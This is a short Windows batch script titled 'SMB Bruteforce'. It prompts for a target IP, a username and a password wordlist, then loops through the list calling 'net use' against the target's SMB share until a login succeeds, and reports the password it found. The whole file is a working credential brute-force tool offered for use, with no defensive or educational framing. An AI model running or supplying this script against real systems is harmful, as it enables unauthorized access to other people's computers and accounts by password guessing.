@echo off
title SMB Bruteforce - by Ebola Man
color A
setlocal enabledelayedexpansion

:: Input
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter full path of Password List: "

:: Remove quotes if user typed them
set wordlist=%wordlist:"=%

:: Check file exists
if not exist "%wordlist%" (
    echo File not found: %wordlist%
    pause
    exit /b
)

:: Counter
set /a count=1

:: Loop through password list
for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "pass=%%a"
    call :attempt
)

echo Password not found :(
pause
exit /b

:success
echo.
echo Password Found! !pass!
:: Disconnect if any connection exists
net use \\%ip% /d /y >nul 2>&1
pause
exit /b

:attempt
echo [ATTEMPT !count!] [!pass!]
net use \\%ip% /user:%user% "!pass!" >nul 2>&1
if !errorlevel! EQU 0 goto success
set /a count+=1
exit /b
